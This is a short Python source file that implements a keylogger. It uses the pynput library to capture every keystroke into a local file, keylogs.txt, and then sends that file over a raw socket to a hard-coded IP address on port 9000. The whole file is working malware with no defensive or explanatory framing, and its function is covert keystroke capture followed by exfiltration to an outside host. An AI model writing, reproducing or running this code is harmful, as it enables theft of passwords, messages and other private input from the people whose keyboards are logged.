import socket
import os
import sys
from pynput import keyboard

def on_press(key):
    with open("keylogs.txt", "a") as f:
        f.write(str(key))

def send_file():
    IP = '192.168.122.182'
    PORT = 9000
    
    with socket.socket() as s:
        s.connect((IP, PORT))
        
        with open("keylogs.txt", "rb") as f:
            data = f.read(1024)
            
            while data:
                s.sendall(data)
                data = f.read(1024)

def main():
    print("Starting keylogger...")
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    
    send_file()

if __name__ == "__main__":
    main()